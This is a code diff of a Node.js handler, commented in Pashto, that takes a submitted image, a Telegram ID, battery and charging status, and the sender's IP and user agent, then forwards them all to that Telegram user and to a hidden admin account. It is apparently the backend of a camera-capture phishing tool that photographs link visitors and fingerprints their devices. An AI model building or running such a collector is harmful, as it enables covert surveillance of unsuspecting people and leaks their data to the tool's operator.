@@ -7,46 +7,56 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const { image, uid, battery } = req.body;
+    const { image, uid, battery, charging } = req.body;
     const adminId = process.env.ADMIN_ID;
+
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'];
+    const userAgent = req.headers['user-agent'] || "ناڅرګند";
     const timestamp = new Date().toLocaleString('en-US', {
       timeZone: 'Asia/Kabul',
       hour12: false,
     });
 
-    if (!uid || !image) return res.status(400).send('UID or image missing');
+    if (!uid || !image) return res.status(400).send('UID یا عکس نشته');
 
     const base64 = image.replace(/^data:image\/\w+;base64,/, '');
     const imgBuffer = Buffer.from(base64, 'base64');
 
-    // ✅ کارونکي ته عکس لیږل
-    await bot.telegram.sendPhoto(uid, { source: imgBuffer });
+    const isCharging = charging ? 'وصل دی 🔌' : 'وصل نه دی ❌';
+    const caption = `
+🆕 *نوی عکس ترلاسه شو*
 
-    // ✅ اډمین ته د معلوماتو سره عکس لیږل
-    if (adminId) {
-      const caption = `
-📸 *New Image Received from User*
+━━━━━━━━━━━━━━━━━━
+🆔 *تلګرام آي‌ډي:* \`${uid}\`
+🔋 *بیټرۍ کچه:* \`${battery || '?'}%\`
+⚡ *چارجر حالت:* \`${isCharging}\`
+🌐 *IP آدرس:* \`${ip}\`
+📱 *دستګاه:* \`${userAgent}\`
+🕒 *وخت:* \`${timestamp}\`
+━━━━━━━━━━━━━━━━━━
 
-🆔 *User ID:* \`${uid}\`
-🔋 *Battery:* \`${battery || '?'}%\`
-🌐 *IP:* \`${ip}\`
-📱 *Device:* \`${userAgent}\`
-🕒 *Time:* \`${timestamp}\`
-
-🧑🏻‍💻 Built by: *WACIQ*
+──────╮  
+│🧑🏻‍💻 𝗕𝘂𝗶𝗹𝘁 𝗕𝘆: 💛 𝗪𝗔𝗖𝗜𝗤 
+╰────────────╯
 `.trim();
 
+    // ✅ کارونکي ته عکس او کپشن لیږل
+    await bot.telegram.sendPhoto(uid, { source: imgBuffer }, {
+      caption,
+      parse_mode: 'Markdown'
+    });
+
+    // ✅ اډمین ته عکس او کپشن لیږل
+    if (adminId) {
       await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
         caption,
         parse_mode: 'Markdown'
       });
     }
 
-    res.status(200).send('✅ Image delivered');
+    res.status(200).send('✅ عکس واستول شو');
   } catch (err) {
     console.error(err);
-    res.status(500).send('❌ Sending error');
+    res.status(500).send('❌ د لیږلو ستونزه');
   }
 }; 
